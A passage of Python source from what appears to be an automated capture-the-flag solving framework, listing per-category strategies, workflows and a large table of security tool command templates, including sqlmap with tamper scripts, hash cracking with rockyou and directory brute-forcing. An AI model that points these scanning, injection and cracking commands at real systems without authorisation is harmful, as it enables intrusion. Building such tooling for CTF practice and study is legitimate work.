                {"strategy": "business_logic", "description": "Focus on business logic flaws and edge cases"}
            ],
            "crypto": [
                {"strategy": "known_plaintext_attack", "description": "Use any known plaintext for cryptanalysis"},
                {"strategy": "frequency_analysis_variants", "description": "Try different frequency analysis approaches"},
                {"strategy": "mathematical_properties", "description": "Exploit mathematical properties of the cipher"},
                {"strategy": "implementation_weaknesses", "description": "Look for implementation-specific weaknesses"},
                {"strategy": "side_channel_analysis", "description": "Analyze timing or other side channels"}
            ],
            "pwn": [
                {"strategy": "alternative_exploitation", "description": "Try alternative exploitation techniques"},
                {"strategy": "information_leaks", "description": "Exploit information disclosure vulnerabilities"},
                {"strategy": "heap_feng_shui", "description": "Use heap manipulation techniques"},
                {"strategy": "ret2libc_variants", "description": "Try different ret2libc approaches"},
                {"strategy": "sigreturn_oriented", "description": "Use SIGROP (Signal Return Oriented Programming)"}
            ],
            "forensics": [
                {"strategy": "alternative_tools", "description": "Try different forensics tools and approaches"},
                {"strategy": "manual_hex_analysis", "description": "Manually analyze hex dumps and file structures"},
                {"strategy": "correlation_analysis", "description": "Correlate findings across multiple evidence sources"},
                {"strategy": "timeline_reconstruction", "description": "Reconstruct detailed timeline of events"},
                {"strategy": "deleted_data_recovery", "description": "Focus on recovering deleted or hidden data"}
            ],
            "rev": [
                {"strategy": "dynamic_analysis_focus", "description": "Shift focus to dynamic analysis techniques"},
                {"strategy": "anti_analysis_bypass", "description": "Bypass anti-analysis and obfuscation"},
                {"strategy": "library_analysis", "description": "Analyze linked libraries and dependencies"},
                {"strategy": "algorithm_identification", "description": "Focus on identifying key algorithms"},
                {"strategy": "patch_analysis", "description": "Analyze patches or modifications to standard code"}
            ],
            "misc": [
                {"strategy": "alternative_interpretations", "description": "Try alternative interpretations of the challenge"},
                {"strategy": "encoding_combinations", "description": "Try combinations of different encodings"},
                {"strategy": "esoteric_approaches", "description": "Consider esoteric or unusual solution approaches"},
                {"strategy": "metadata_focus", "description": "Focus heavily on metadata and hidden information"},
                {"strategy": "collaborative_solving", "description": "Use collaborative problem-solving techniques"}
            ],
            "osint": [
                {"strategy": "alternative_sources", "description": "Try alternative information sources"},
                {"strategy": "historical_data", "description": "Look for historical or archived information"},
                {"strategy": "social_engineering", "description": "Use social engineering techniques (ethically)"},
                {"strategy": "cross_reference", "description": "Cross-reference information across multiple platforms"},
                {"strategy": "deep_web_search", "description": "Search in deep web and specialized databases"}
            ]
        }
        return fallback_strategies.get(category, [])
    
    def _analyze_description_complexity(self, description: str) -> float:
        """Analyze challenge description complexity to adjust time estimates"""
        complexity_score = 0.0
        description_lower = description.lower()
        
        # Length-based complexity
        if len(description) > 500:
            complexity_score += 0.3
        elif len(description) > 200:
            complexity_score += 0.1
        
        # Technical term density
        technical_terms = [
            "algorithm", "encryption", "decryption", "vulnerability", "exploit",
            "buffer overflow", "sql injection", "xss", "csrf", "authentication",
            "authorization", "cryptography", "steganography", "forensics",
            "reverse engineering", "binary analysis", "memory corruption",
            "heap", "stack", "rop", "shellcode", "payload"
        ]
        
        term_count = sum(1 for term in technical_terms if term in description_lower)
        complexity_score += min(0.4, term_count * 0.05)
        
        # Multi-step indicators
        multi_step_indicators = ["first", "then", "next", "after", "finally", "step"]
        step_count = sum(1 for indicator in multi_step_indicators if indicator in description_lower)
        complexity_score += min(0.3, step_count * 0.1)
        
        return min(1.0, complexity_score)
    
    def _create_advanced_category_workflow(self, challenge: CTFChallenge) -> List[Dict[str, Any]]:
        """Create advanced category-specific workflow with parallel execution support"""
        advanced_workflows = {
            "web": [
                {"step": 1, "action": "automated_reconnaissance", "description": "Automated web reconnaissance and technology detection", "parallel": True, "tools": ["httpx", "whatweb", "katana"], "estimated_time": 300},
                {"step": 2, "action": "source_code_analysis", "description": "Comprehensive source code and comment analysis", "parallel": False, "tools": ["manual"], "estimated_time": 600},
                {"step": 3, "action": "directory_enumeration", "description": "Multi-tool directory and file enumeration", "parallel": True, "tools": ["gobuster", "dirsearch", "feroxbuster"], "estimated_time": 900},
                {"step": 4, "action": "parameter_discovery", "description": "Parameter discovery and testing", "parallel": True, "tools": ["arjun", "paramspider"], "estimated_time": 600},
                {"step": 5, "action": "vulnerability_scanning", "description": "Automated vulnerability scanning", "parallel": True, "tools": ["sqlmap", "dalfox", "nikto"], "estimated_time": 1200},
                {"step": 6, "action": "manual_testing", "description": "Manual testing of discovered attack vectors", "parallel": False, "tools": ["manual"], "estimated_time": 1800},
                {"step": 7, "action": "exploitation", "description": "Exploit discovered vulnerabilities", "parallel": False, "tools": ["custom"], "estimated_time": 900},
                {"step": 8, "action": "flag_extraction", "description": "Extract and validate flag", "parallel": False, "tools": ["manual"], "estimated_time": 300}
            ],
            "crypto": [
                {"step": 1, "action": "cipher_identification", "description": "Identify cipher type and properties", "parallel": False, "tools": ["cipher-identifier", "hash-identifier"], "estimated_time": 300},
                {"step": 2, "action": "key_space_analysis", "description": "Analyze key space and potential weaknesses", "parallel": False, "tools": ["manual"], "estimated_time": 600},
                {"step": 3, "action": "automated_attacks", "description": "Launch automated cryptographic attacks", "parallel": True, "tools": ["hashcat", "john", "factordb"], "estimated_time": 1800},
                {"step": 4, "action": "mathematical_analysis", "description": "Mathematical analysis of cipher properties", "parallel": False, "tools": ["sage", "python"], "estimated_time": 1200},
                {"step": 5, "action": "frequency_analysis", "description": "Statistical and frequency analysis", "parallel": True, "tools": ["frequency-analysis", "substitution-solver"], "estimated_time": 900},
                {"step": 6, "action": "known_plaintext", "description": "Known plaintext and chosen plaintext attacks", "parallel": False, "tools": ["custom"], "estimated_time": 1200},
                {"step": 7, "action": "implementation_analysis", "description": "Analyze implementation for weaknesses", "parallel": False, "tools": ["manual"], "estimated_time": 900},
                {"step": 8, "action": "solution_verification", "description": "Verify and extract flag", "parallel": False, "tools": ["manual"], "estimated_time": 300}
            ],
            "pwn": [
                {"step": 1, "action": "binary_reconnaissance", "description": "Comprehensive binary analysis and protection identification", "parallel": True, "tools": ["checksec", "file", "strings", "objdump"], "estimated_time": 600},
                {"step": 2, "action": "static_analysis", "description": "Static analysis with multiple tools", "parallel": True, "tools": ["ghidra", "radare2", "ida"], "estimated_time": 1800},
                {"step": 3, "action": "dynamic_analysis", "description": "Dynamic analysis and debugging", "parallel": False, "tools": ["gdb-peda", "ltrace", "strace"], "estimated_time": 1200},
                {"step": 4, "action": "vulnerability_identification", "description": "Identify exploitable vulnerabilities", "parallel": False, "tools": ["manual"], "estimated_time": 900},
                {"step": 5, "action": "exploit_development", "description": "Develop exploit payload", "parallel": False, "tools": ["pwntools", "ropper", "one-gadget"], "estimated_time": 2400},
                {"step": 6, "action": "local_testing", "description": "Test exploit locally", "parallel": False, "tools": ["gdb-peda"], "estimated_time": 600},
                {"step": 7, "action": "remote_exploitation", "description": "Execute exploit against remote target", "parallel": False, "tools": ["pwntools"], "estimated_time": 600},
                {"step": 8, "action": "post_exploitation", "description": "Post-exploitation and flag extraction", "parallel": False, "tools": ["manual"], "estimated_time": 300}
            ],
            "forensics": [
                {"step": 1, "action": "evidence_acquisition", "description": "Acquire and validate digital evidence", "parallel": False, "tools": ["file", "exiftool"], "estimated_time": 300},
                {"step": 2, "action": "file_analysis", "description": "Comprehensive file structure analysis", "parallel": True, "tools": ["binwalk", "foremost", "strings"], "estimated_time": 900},
                {"step": 3, "action": "metadata_extraction", "description": "Extract and analyze metadata", "parallel": True, "tools": ["exiftool", "steghide"], "estimated_time": 600},
                {"step": 4, "action": "steganography_detection", "description": "Detect and extract hidden data", "parallel": True, "tools": ["stegsolve", "zsteg", "outguess"], "estimated_time": 1200},
                {"step": 5, "action": "memory_analysis", "description": "Memory dump analysis if applicable", "parallel": False, "tools": ["volatility", "volatility3"], "estimated_time": 1800},
                {"step": 6, "action": "network_analysis", "description": "Network traffic analysis if applicable", "parallel": False, "tools": ["wireshark", "tcpdump"], "estimated_time": 1200},
                {"step": 7, "action": "timeline_reconstruction", "description": "Reconstruct timeline of events", "parallel": False, "tools": ["manual"], "estimated_time": 900},
                {"step": 8, "action": "evidence_correlation", "description": "Correlate findings and extract flag", "parallel": False, "tools": ["manual"], "estimated_time": 600}
            ],
            "rev": [
                {"step": 1, "action": "binary_triage", "description": "Initial binary triage and classification", "parallel": True, "tools": ["file", "strings", "checksec"], "estimated_time": 300},
                {"step": 2, "action": "packer_detection", "description": "Detect and unpack if necessary", "parallel": False, "tools": ["upx", "peid", "detect-it-easy"], "estimated_time": 600},
                {"step": 3, "action": "static_disassembly", "description": "Static disassembly and analysis", "parallel": True, "tools": ["ghidra", "ida", "radare2"], "estimated_time": 2400},
                {"step": 4, "action": "dynamic_analysis", "description": "Dynamic analysis and debugging", "parallel": False, "tools": ["gdb-peda", "ltrace", "strace"], "estimated_time": 1800},
                {"step": 5, "action": "algorithm_identification", "description": "Identify key algorithms and logic", "parallel": False, "tools": ["manual"], "estimated_time": 1200},
                {"step": 6, "action": "key_extraction", "description": "Extract keys, passwords, or critical values", "parallel": False, "tools": ["manual"], "estimated_time": 900},
                {"step": 7, "action": "solution_implementation", "description": "Implement solution based on analysis", "parallel": False, "tools": ["python", "custom"], "estimated_time": 1200},
                {"step": 8, "action": "flag_generation", "description": "Generate or extract the flag", "parallel": False, "tools": ["manual"], "estimated_time": 300}
            ],
            "misc": [
                {"step": 1, "action": "challenge_analysis", "description": "Analyze challenge type and requirements", "parallel": False, "tools": ["manual"], "estimated_time": 300},
                {"step": 2, "action": "encoding_detection", "description": "Detect encoding or obfuscation methods", "parallel": True, "tools": ["base64", "hex", "rot13"], "estimated_time": 600},
                {"step": 3, "action": "format_identification", "description": "Identify file formats or data structures", "parallel": False, "tools": ["file", "binwalk"], "estimated_time": 300},
                {"step": 4, "action": "specialized_analysis", "description": "Apply specialized analysis techniques", "parallel": True, "tools": ["qr-decoder", "audio-analysis"], "estimated_time": 900},
                {"step": 5, "action": "pattern_recognition", "description": "Identify patterns and relationships", "parallel": False, "tools": ["manual"], "estimated_time": 600},
                {"step": 6, "action": "solution_implementation", "description": "Implement solution approach", "parallel": False, "tools": ["python", "custom"], "estimated_time": 900},
                {"step": 7, "action": "validation", "description": "Validate solution and extract flag", "parallel": False, "tools": ["manual"], "estimated_time": 300}
            ],
            "osint": [
                {"step": 1, "action": "target_identification", "description": "Identify and validate targets", "parallel": False, "tools": ["manual"], "estimated_time": 300},
                {"step": 2, "action": "automated_reconnaissance", "description": "Automated OSINT gathering", "parallel": True, "tools": ["sherlock", "theHarvester", "sublist3r"], "estimated_time": 1200},
                {"step": 3, "action": "social_media_analysis", "description": "Social media intelligence gathering", "parallel": True, "tools": ["sherlock", "social-analyzer"], "estimated_time": 900},
                {"step": 4, "action": "domain_analysis", "description": "Domain and DNS intelligence", "parallel": True, "tools": ["whois", "dig", "amass"], "estimated_time": 600},
                {"step": 5, "action": "search_engine_intelligence", "description": "Search engine and database queries", "parallel": True, "tools": ["shodan", "censys"], "estimated_time": 900},
                {"step": 6, "action": "correlation_analysis", "description": "Correlate information across sources", "parallel": False, "tools": ["manual"], "estimated_time": 1200},
                {"step": 7, "action": "verification", "description": "Verify findings and extract flag", "parallel": False, "tools": ["manual"], "estimated_time": 600}
            ]
        }
        
        return advanced_workflows.get(challenge.category, [
            {"step": 1, "action": "analysis", "description": "Analyze the challenge", "parallel": False, "tools": ["manual"], "estimated_time": 600},
            {"step": 2, "action": "research", "description": "Research relevant techniques", "parallel": False, "tools": ["manual"], "estimated_time": 900},
            {"step": 3, "action": "implementation", "description": "Implement solution", "parallel": False, "tools": ["custom"], "estimated_time": 1800},
            {"step": 4, "action": "testing", "description": "Test the solution", "parallel": False, "tools": ["manual"], "estimated_time": 600},
            {"step": 5, "action": "refinement", "description": "Refine approach if needed", "parallel": False, "tools": ["manual"], "estimated_time": 900},
            {"step": 6, "action": "flag_submission", "description": "Submit the flag", "parallel": False, "tools": ["manual"], "estimated_time": 300}
        ])
    
    def _identify_parallel_tasks(self, category: str) -> List[Dict[str, Any]]:
        """Identify tasks that can be executed in parallel for efficiency"""
        parallel_tasks = {
            "web": [
                {"task_group": "reconnaissance", "tasks": ["httpx", "whatweb", "katana"], "max_concurrent": 3},
                {"task_group": "directory_enumeration", "tasks": ["gobuster", "dirsearch", "feroxbuster"], "max_concurrent": 2},
                {"task_group": "parameter_discovery", "tasks": ["arjun", "paramspider"], "max_concurrent": 2},
                {"task_group": "vulnerability_scanning", "tasks": ["sqlmap", "dalfox", "nikto"], "max_concurrent": 2}
            ],
            "crypto": [
                {"task_group": "hash_cracking", "tasks": ["hashcat", "john"], "max_concurrent": 2},
                {"task_group": "cipher_analysis", "tasks": ["frequency-analysis", "substitution-solver"], "max_concurrent": 2},
                {"task_group": "factorization", "tasks": ["factordb", "yafu"], "max_concurrent": 2}
            ],
            "pwn": [
                {"task_group": "binary_analysis", "tasks": ["checksec", "file", "strings", "objdump"], "max_concurrent": 4},
                {"task_group": "static_analysis", "tasks": ["ghidra", "radare2"], "max_concurrent": 2},
                {"task_group": "gadget_finding", "tasks": ["ropper", "ropgadget"], "max_concurrent": 2}
            ],
            "forensics": [
                {"task_group": "file_analysis", "tasks": ["binwalk", "foremost", "strings"], "max_concurrent": 3},
                {"task_group": "steganography", "tasks": ["stegsolve", "zsteg", "outguess"], "max_concurrent": 3},
                {"task_group": "metadata_extraction", "tasks": ["exiftool", "steghide"], "max_concurrent": 2}
            ],
            "rev": [
                {"task_group": "initial_analysis", "tasks": ["file", "strings", "checksec"], "max_concurrent": 3},
                {"task_group": "disassembly", "tasks": ["ghidra", "radare2"], "max_concurrent": 2},
                {"task_group": "packer_detection", "tasks": ["upx", "peid", "detect-it-easy"], "max_concurrent": 3}
            ],
            "osint": [
                {"task_group": "username_search", "tasks": ["sherlock", "social-analyzer"], "max_concurrent": 2},
                {"task_group": "domain_recon", "tasks": ["sublist3r", "amass", "dig"], "max_concurrent": 3},
                {"task_group": "search_engines", "tasks": ["shodan", "censys"], "max_concurrent": 2}
            ],
            "misc": [
                {"task_group": "encoding_detection", "tasks": ["base64", "hex", "rot13"], "max_concurrent": 3},
                {"task_group": "format_analysis", "tasks": ["file", "binwalk"], "max_concurrent": 2}
            ]
        }
        
        return parallel_tasks.get(category, [])
    
    def _calculate_resource_requirements(self, challenge: CTFChallenge) -> Dict[str, Any]:
        """Calculate estimated resource requirements for challenge"""
        base_requirements = {
            "cpu_cores": 2,
            "memory_mb": 2048,
            "disk_space_mb": 1024,
            "network_bandwidth": "medium",
            "gpu_required": False,
            "special_tools": []
        }
        
        # Adjust based on category
        category_adjustments = {
            "web": {"cpu_cores": 4, "memory_mb": 4096, "network_bandwidth": "high"},
            "crypto": {"cpu_cores": 8, "memory_mb": 8192, "gpu_required": True},
            "pwn": {"cpu_cores": 4, "memory_mb": 4096, "special_tools": ["gdb", "pwntools"]},
            "forensics": {"cpu_cores": 2, "memory_mb": 8192, "disk_space_mb": 4096},
            "rev": {"cpu_cores": 4, "memory_mb": 8192, "special_tools": ["ghidra", "ida"]},
            "osint": {"cpu_cores": 2, "memory_mb": 2048, "network_bandwidth": "high"},
            "misc": {"cpu_cores": 2, "memory_mb": 2048}
        }
        
        if challenge.category in category_adjustments:
            base_requirements.update(category_adjustments[challenge.category])
        
        # Adjust based on difficulty
        difficulty_multipliers = {
            "easy": 1.0,
            "medium": 1.2,
            "hard": 1.5,
            "insane": 2.0,
            "unknown": 1.3
        }
        
        multiplier = difficulty_multipliers[challenge.difficulty]
        base_requirements["cpu_cores"] = int(base_requirements["cpu_cores"] * multiplier)
        base_requirements["memory_mb"] = int(base_requirements["memory_mb"] * multiplier)
        base_requirements["disk_space_mb"] = int(base_requirements["disk_space_mb"] * multiplier)
        
        return base_requirements
    
    def _predict_expected_artifacts(self, challenge: CTFChallenge) -> List[Dict[str, str]]:
        """Predict expected artifacts and outputs from challenge solving"""
        artifacts = {
            "web": [
                {"type": "http_responses", "description": "HTTP response data and headers"},
                {"type": "source_code", "description": "Downloaded source code and scripts"},
                {"type": "directory_lists", "description": "Discovered directories and files"},
                {"type": "vulnerability_reports", "description": "Vulnerability scan results"},
                {"type": "exploit_payloads", "description": "Working exploit payloads"},
                {"type": "session_data", "description": "Session tokens and cookies"}
            ],
            "crypto": [
                {"type": "plaintext", "description": "Decrypted plaintext data"},
                {"type": "keys", "description": "Recovered encryption keys"},
                {"type": "cipher_analysis", "description": "Cipher analysis results"},
                {"type": "frequency_data", "description": "Frequency analysis data"},
                {"type": "mathematical_proof", "description": "Mathematical proof of solution"}
            ],
            "pwn": [
                {"type": "exploit_code", "description": "Working exploit code"},
                {"type": "shellcode", "description": "Custom shellcode payloads"},
                {"type": "memory_dumps", "description": "Memory dumps and analysis"},
                {"type": "rop_chains", "description": "ROP chain constructions"},
                {"type": "debug_output", "description": "Debugging session outputs"}
            ],
            "forensics": [
                {"type": "recovered_files", "description": "Recovered deleted files"},
                {"type": "extracted_data", "description": "Extracted hidden data"},
                {"type": "timeline", "description": "Timeline of events"},
                {"type": "metadata", "description": "File metadata and properties"},
                {"type": "network_flows", "description": "Network traffic analysis"}
            ],
            "rev": [
                {"type": "decompiled_code", "description": "Decompiled source code"},
                {"type": "algorithm_analysis", "description": "Identified algorithms"},
                {"type": "key_values", "description": "Extracted keys and constants"},
                {"type": "control_flow", "description": "Control flow analysis"},
                {"type": "solution_script", "description": "Solution implementation script"}
            ],
            "osint": [
                {"type": "intelligence_report", "description": "Compiled intelligence report"},
                {"type": "social_profiles", "description": "Discovered social media profiles"},
                {"type": "domain_data", "description": "Domain registration and DNS data"},
                {"type": "correlation_matrix", "description": "Information correlation analysis"},
                {"type": "verification_data", "description": "Verification of findings"}
            ],
            "misc": [
                {"type": "decoded_data", "description": "Decoded or decrypted data"},
                {"type": "pattern_analysis", "description": "Pattern recognition results"},
                {"type": "solution_explanation", "description": "Explanation of solution approach"},
                {"type": "intermediate_results", "description": "Intermediate calculation results"}
            ]
        }
        
        return artifacts.get(challenge.category, [
            {"type": "solution_data", "description": "Solution-related data"},
            {"type": "analysis_results", "description": "Analysis results and findings"}
        ])
    
    def _create_validation_steps(self, category: str) -> List[Dict[str, str]]:
        """Create validation steps to verify solution correctness"""
        validation_steps = {
            "web": [
                {"step": "response_validation", "description": "Validate HTTP responses and status codes"},
                {"step": "payload_verification", "description": "Verify exploit payloads work correctly"},
                {"step": "flag_format_check", "description": "Check flag format matches expected pattern"},
                {"step": "reproducibility_test", "description": "Test solution reproducibility"}
            ],
            "crypto": [
                {"step": "decryption_verification", "description": "Verify decryption produces readable text"},
                {"step": "key_validation", "description": "Validate recovered keys are correct"},
                {"step": "mathematical_check", "description": "Verify mathematical correctness"},
                {"step": "flag_extraction", "description": "Extract and validate flag from plaintext"}
            ],
            "pwn": [
                {"step": "exploit_reliability", "description": "Test exploit reliability and success rate"},
                {"step": "payload_verification", "description": "Verify payload executes correctly"},
                {"step": "shell_validation", "description": "Validate shell access and commands"},
                {"step": "flag_retrieval", "description": "Successfully retrieve flag from target"}
            ],
            "forensics": [
                {"step": "data_integrity", "description": "Verify integrity of recovered data"},
                {"step": "timeline_accuracy", "description": "Validate timeline accuracy"},
                {"step": "evidence_correlation", "description": "Verify evidence correlation is correct"},
                {"step": "flag_location", "description": "Confirm flag location and extraction"}
            ],
            "rev": [
                {"step": "algorithm_accuracy", "description": "Verify algorithm identification is correct"},
                {"step": "key_extraction", "description": "Validate extracted keys and values"},
                {"step": "solution_testing", "description": "Test solution against known inputs"},
                {"step": "flag_generation", "description": "Generate correct flag using solution"}
            ],
            "osint": [
                {"step": "source_verification", "description": "Verify information sources are reliable"},
                {"step": "cross_reference", "description": "Cross-reference findings across sources"},
                {"step": "accuracy_check", "description": "Check accuracy of gathered intelligence"},
                {"step": "flag_confirmation", "description": "Confirm flag from verified information"}
            ],
            "misc": [
                {"step": "solution_verification", "description": "Verify solution approach is correct"},
                {"step": "output_validation", "description": "Validate output format and content"},
                {"step": "edge_case_testing", "description": "Test solution with edge cases"},
                {"step": "flag_extraction", "description": "Extract and validate final flag"}
            ]
        }
        
        return validation_steps.get(category, [
            {"step": "general_validation", "description": "General solution validation"},
            {"step": "flag_verification", "description": "Verify flag format and correctness"}
        ])

class CTFToolManager:
    """Advanced tool manager for CTF challenges with comprehensive tool arsenal"""
    
    def __init__(self):
        self.tool_commands = {
            # Web Application Security Tools
            "httpx": "httpx -probe -tech-detect -status-code -title -content-length",
            "katana": "katana -depth 3 -js-crawl -form-extraction -headless",
            "sqlmap": "sqlmap --batch --level 3 --risk 2 --threads 5",
            "dalfox": "dalfox url --mining-dom --mining-dict --deep-domxss",
            "gobuster": "gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,js",
            "dirsearch": "dirsearch -u {} -e php,html,js,txt,xml,json -t 50",
            "feroxbuster": "feroxbuster -u {} -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,js,txt",
            "arjun": "arjun -u {} --get --post",
            "paramspider": "paramspider -d {}",
            "wpscan": "wpscan --url {} --enumerate ap,at,cb,dbe",
            "nikto": "nikto -h {} -C all",
            "whatweb": "whatweb -v -a 3",
            
            # Cryptography Challenge Tools
            "hashcat": "hashcat -m 0 -a 0 --potfile-disable --quiet",
            "john": "john --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5",
            "hash-identifier": "hash-identifier",
            "hashid": "hashid -m",
            "cipher-identifier": "python3 /opt/cipher-identifier/cipher_identifier.py",
            "factordb": "python3 /opt/factordb/factordb.py",
            "rsatool": "python3 /opt/rsatool/rsatool.py",
            "yafu": "yafu",
            "sage": "sage -python",
            "openssl": "openssl",
            "gpg": "gpg --decrypt",
            "steganography": "stegcracker",
            "frequency-analysis": "python3 /opt/frequency-analysis/freq_analysis.py",
            "substitution-solver": "python3 /opt/substitution-solver/solve.py",
            "vigenere-solver": "python3 /opt/vigenere-solver/vigenere.py",
            "base64": "base64 -d",
            "base32": "base32 -d",
            "hex": "xxd -r -p",
            "rot13": "tr 'A-Za-z' 'N-ZA-Mn-za-m'",
            
            # Binary Exploitation (Pwn) Tools
            "checksec": "checksec --file",
            "pwntools": "python3 -c 'from pwn import *; context.log_level = \"debug\"'",
            "ropper": "ropper --file {} --search",
            "ropgadget": "ROPgadget --binary",
            "one-gadget": "one_gadget",
            "gdb-peda": "gdb -ex 'source /opt/peda/peda.py'",
            "gdb-gef": "gdb -ex 'source /opt/gef/gef.py'",
            "gdb-pwngdb": "gdb -ex 'source /opt/Pwngdb/pwngdb.py'",
            "angr": "python3 -c 'import angr'",
            "radare2": "r2 -A",
            "ghidra": "analyzeHeadless /tmp ghidra_project -import",
            "binary-ninja": "binaryninja",
            "ltrace": "ltrace",
            "strace": "strace -f",
            "objdump": "objdump -d -M intel",
            "readelf": "readelf -a",
            "nm": "nm -D",
            "ldd": "ldd",
            "file": "file",
            "strings": "strings -n 8",
            "hexdump": "hexdump -C",
            "pwninit": "pwninit",
            "libc-database": "python3 /opt/libc-database/find.py",
            
            # Forensics Investigation Tools
            "binwalk": "binwalk -e --dd='.*'",
            "foremost": "foremost -i {} -o /tmp/foremost_output",
            "photorec": "photorec /log /cmd",
            "testdisk": "testdisk /log",
            "exiftool": "exiftool -all",
            "steghide": "steghide extract -sf {} -p ''",
            "stegsolve": "java -jar /opt/stegsolve/stegsolve.jar",
            "zsteg": "zsteg -a",
            "outguess": "outguess -r",
            "jsteg": "jsteg reveal",
            "volatility": "volatility -f {} imageinfo",
            "volatility3": "python3 /opt/volatility3/vol.py -f",
            "rekall": "rekall -f",
            "wireshark": "tshark -r",
            "tcpdump": "tcpdump -r",
            "networkminer": "mono /opt/NetworkMiner/NetworkMiner.exe",
            "autopsy": "autopsy",
            "sleuthkit": "fls -r",
            "scalpel": "scalpel -c /etc/scalpel/scalpel.conf",
            "bulk-extractor": "bulk_extractor -o /tmp/bulk_output",
            "ddrescue": "ddrescue",
            "dc3dd": "dc3dd",
            
            # Reverse Engineering Tools
            "ida": "ida64",
            "ida-free": "ida64 -A",
            "retdec": "retdec-decompiler",
            "upx": "upx -d",
            "peid": "peid",
            "detect-it-easy": "die",
            "x64dbg": "x64dbg",
            "ollydbg": "ollydbg",
            "immunity": "immunity",
            "windbg": "windbg",
            "apktool": "apktool d",
            "jadx": "jadx",
            "dex2jar": "dex2jar",
            "jd-gui": "jd-gui",
            "dnspy": "dnspy",
            "ilspy": "ilspy",
            "dotpeek": "dotpeek",
            
            # OSINT and Reconnaissance Tools
            "sherlock": "sherlock",
            "social-analyzer": "social-analyzer",
            "theHarvester": "theHarvester -d {} -b all",
            "recon-ng": "recon-ng",
            "maltego": "maltego",
            "spiderfoot": "spiderfoot",
            "shodan": "shodan search",
            "censys": "censys search",
            "whois": "whois",
            "dig": "dig",
            "nslookup": "nslookup",
            "host": "host",
            "dnsrecon": "dnsrecon -d",
            "fierce": "fierce -dns",
            "sublist3r": "sublist3r -d",
            "amass": "amass enum -d",
            "assetfinder": "assetfinder",
            "subfinder": "subfinder -d",
            "waybackurls": "waybackurls",
            "gau": "gau",
            "httpx-osint": "httpx -title -tech-detect -status-code",
            
            # Miscellaneous Challenge Tools
            "qr-decoder": "zbarimg",
            "barcode-decoder": "zbarimg",
            "audio-analysis": "audacity",
            "sonic-visualizer": "sonic-visualizer",
            "spectrum-analyzer": "python3 /opt/spectrum-analyzer/analyze.py",
            "brainfuck": "python3 /opt/brainfuck/bf.py",
            "whitespace": "python3 /opt/whitespace/ws.py",
            "piet": "python3 /opt/piet/piet.py",
            "malbolge": "python3 /opt/malbolge/malbolge.py",
            "ook": "python3 /opt/ook/ook.py",
            "zip": "unzip -P",
            "7zip": "7z x -p",
            "rar": "unrar x -p",
            "tar": "tar -xf",
            "gzip": "gunzip",
            "bzip2": "bunzip2",
            "xz": "unxz",
            "lzma": "unlzma",
            "compress": "uncompress",
            
            # Modern Web Technologies
            "jwt-tool": "python3 /opt/jwt_tool/jwt_tool.py",
            "jwt-cracker": "jwt-cracker",
            "graphql-voyager": "graphql-voyager",
            "graphql-playground": "graphql-playground",
            "postman": "newman run",
            "burpsuite": "java -jar /opt/burpsuite/burpsuite.jar",
            "owasp-zap": "zap.sh -cmd",
            "websocket-king": "python3 /opt/websocket-king/ws_test.py",
            
            # Cloud and Container Security
            "docker": "docker",
            "kubectl": "kubectl",
            "aws-cli": "aws",
            "azure-cli": "az",
            "gcloud": "gcloud",
            "terraform": "terraform",
            "ansible": "ansible",
            
            # Mobile Application Security
            "adb": "adb",
            "frida": "frida",
            "objection": "objection",
            "mobsf": "python3 /opt/mobsf/manage.py",
            "apkleaks": "apkleaks -f",
            "qark": "qark --apk"
        }
        
        # Tool categories for intelligent selection
        self.tool_categories = {
            "web_recon": ["httpx", "katana", "waybackurls", "gau", "whatweb"],
            "web_vuln": ["sqlmap", "dalfox", "nikto", "wpscan"],
            "web_discovery": ["gobuster", "dirsearch", "feroxbuster"],
            "web_params": ["arjun", "paramspider"],
            "crypto_hash": ["hashcat", "john", "hash-identifier", "hashid"],
            "crypto_cipher": ["cipher-identifier", "frequency-analysis", "substitution-solver"],
            "crypto_rsa": ["rsatool", "factordb", "yafu"],
            "crypto_modern": ["sage", "openssl", "gpg"],
            "pwn_analysis": ["checksec", "file", "strings", "objdump", "readelf"],
            "pwn_exploit": ["pwntools", "ropper", "ropgadget", "one-gadget"],
            "pwn_debug": ["gdb-peda", "gdb-gef", "ltrace", "strace"],
            "pwn_advanced": ["angr", "ghidra", "radare2"],
            "forensics_file": ["binwalk", "foremost", "photorec", "exiftool"],
            "forensics_image": ["steghide", "stegsolve", "zsteg", "outguess"],
            "forensics_memory": ["volatility", "volatility3", "rekall"],
            "forensics_network": ["wireshark", "tcpdump", "networkminer"],
            "rev_static": ["ghidra", "ida", "radare2", "strings"],
            "rev_dynamic": ["gdb-peda", "ltrace", "strace"],
            "rev_unpack": ["upx", "peid", "detect-it-easy"],
            "osint_social": ["sherlock", "social-analyzer", "theHarvester"],
            "osint_domain": ["whois", "dig", "sublist3r", "amass"],
            "osint_search": ["shodan", "censys", "recon-ng"],
            "misc_encoding": ["base64", "base32", "hex", "rot13"],
            "misc_compression": ["zip", "7zip", "rar", "tar"],
            "misc_esoteric": ["brainfuck", "whitespace", "piet", "malbolge"]
        }
    
    def get_tool_command(self, tool: str, target: str, additional_args: str = "") -> str:
        """Get optimized command for CTF tool with intelligent parameter selection"""
        base_command = self.tool_commands.get(tool, tool)
        
        # Add intelligent parameter optimization based on tool type
        if tool in ["hashcat", "john"]:
            # For hash cracking, add common wordlists and rules
            if "wordlist" not in base_command:
                base_command += " --wordlist=/usr/share/wordlists/rockyou.txt"
            if tool == "hashcat" and "--rules" not in base_command:
                base_command += " --rules-file=/usr/share/hashcat/rules/best64.rule"
        
        elif tool in ["sqlmap"]:
            # For SQL injection, add tamper scripts and optimization
            if "--tamper" not in base_command:
                base_command += " --tamper=space2comment,charencode,randomcase"
            if "--threads" not in base_command:
                base_command += " --threads=5"
        
        elif tool in ["gobuster", "dirsearch", "feroxbuster"]:
            # For directory brute forcing, optimize threads and extensions
            if tool == "gobuster" and "-t" not in base_command:
                base_command += " -t 50"
            elif tool == "dirsearch" and "-t" not in base_command:
                base_command += " -t 50"
            elif tool == "feroxbuster" and "-t" not in base_command:
                base_command += " -t 50"
        
        if additional_args:
            return f"{base_command} {additional_args} {target}"
        else:
            return f"{base_command} {target}"
    
    def get_category_tools(self, category: str) -> List[str]:
        """Get all tools for a specific category"""
        return self.tool_categories.get(category, [])
    
    def suggest_tools_for_challenge(self, challenge_description: str, category: str) -> List[str]:
        """Suggest optimal tools based on challenge description and category"""
        suggested_tools = []
        description_lower = challenge_description.lower()
        
        # Category-based tool suggestions
        if category == "web":
            suggested_tools.extend(self.tool_categories["web_recon"][:2])
            
